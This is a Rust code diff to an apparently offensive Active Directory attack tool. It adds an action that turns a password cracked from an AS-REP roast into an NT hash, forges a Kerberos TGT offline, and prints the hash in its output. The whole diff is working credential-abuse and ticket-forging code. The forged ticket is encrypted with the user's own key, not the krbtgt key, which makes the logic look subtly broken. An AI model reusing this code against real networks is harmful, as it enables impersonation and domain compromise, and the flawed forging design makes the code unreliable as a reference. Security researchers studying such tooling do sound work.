@@ -53,6 +53,16 @@ pub enum ForgeAction {
         /// Crackedplaintext password from AS-REP roast
         cracked_password: String,
     },
+    /// Forge a TGT offline from a cracked AS-REP password.
+    /// Derives NT hash from password and builds TGT locally — no KDC contact.
+    AsRepToTgtOffline {
+        /// Cracked plaintext password from AS-REP roast
+        cracked_password: String,
+        /// Domain SID (S-1-5-21-...) — required for PAC building
+        domain_sid: String,
+        /// User RID (default: 500)
+        user_rid: u32,
+    },
     /// PKINIT Authentication — certificate-based TGT acquisition with optional
     /// session key extraction for ticket forging. When --pkinit-keyed-ticket is
     /// also set, the TGT session key is used as the encryption key for forging
@@ -108,6 +118,7 @@ impl std::fmt::Display for ForgeAction {
                 write!(f, "Convert Ticket ({} → {})", input_path, output_format)
             }
             Self::AsRepToTgt { .. } => write!(f, "AS-REP → TGT"),
+            Self::AsRepToTgtOffline { .. } => write!(f, "AS-REP → TGT (offline)"),
             Self::PkinitAuth => write!(f, "PKINIT Authentication"),
             Self::AdcsExploit { action, ca_url, .. } => {
                 write!(f, "ADCS {} ({})", action.to_uppercase(), ca_url)
@@ -518,6 +529,64 @@ pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
                     ticket_data: None,
                     persistence_result: None,
                     message: format!("Failed to request TGT with AS-REP password: {}", e),
+                },
+            }
+        }
+        ForgeAction::AsRepToTgtOffline {
+            cracked_password,
+            domain_sid,
+            user_rid,
+        } => {
+            // Derive NT hash from cracked password, forge TGT locally — no KDC.
+            use overthrone_core::proto::kerberos::forge_tgt;
+            use overthrone_core::proto::ntlm::nt_hash;
+
+            let user_key = nt_hash(cracked_password);
+            let etype = 23i32; // RC4-HMAC
+
+            match forge_tgt(
+                &config.domain,
+                domain_sid,
+                &config.username,
+                *user_rid,
+                &user_key,
+                etype,
+            ) {
+                Ok(tgt) => ForgeResult {
+                    action: "AS-REP → TGT (offline)".to_string(),
+                    domain: config.domain.clone(),
+                    success: true,
+                    ticket_data: Some(ForgedTicket {
+                        ticket_type: "TGT".to_string(),
+                        impersonated_user: config.username.clone(),
+                        domain: config.domain.clone(),
+                        spn: format!("krbtgt/{}", config.domain),
+                        encryption_type: "RC4-HMAC".to_string(),
+                        valid_from: String::new(),
+                        valid_until: String::new(),
+                        group_rids: vec![],
+                        extra_sids: vec![],
+                        kirbi_path: None,
+                        ccache_path: None,
+                        kirbi_base64: None,
+                        ticket_size_bytes: tgt.ticket.enc_part.cipher.len(),
+                    }),
+                    persistence_result: None,
+                    message: format!(
+                        "Offline TGT forged for {}@{} (NT hash: {}, ticket encrypted with user key, {} bytes)",
+                        config.username,
+                        config.domain,
+                        hex::encode(&user_key),
+                        tgt.ticket.enc_part.cipher.len()
+                    ),
+                },
+                Err(e) => ForgeResult {
+                    action: "AS-REP → TGT (offline)".to_string(),
+                    domain: config.domain.clone(),
+                    success: false,
+                    ticket_data: None,
+                    persistence_result: None,
+                    message: format!("Failed to forge offline TGT: {e}"),
                 },
             }
         }
